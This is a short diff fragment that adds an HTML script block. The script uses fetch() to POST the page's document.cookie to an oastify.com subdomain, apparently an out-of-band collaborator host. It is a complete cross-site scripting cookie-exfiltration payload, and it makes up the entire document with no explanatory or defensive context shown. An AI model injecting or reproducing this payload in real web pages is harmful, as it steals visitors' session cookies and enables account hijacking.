@@ -1,0 +1,7 @@
+<script>
+fetch('https://1subynd0z3mbmdaoy6ur4rjge7kx8m.oastify.com', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
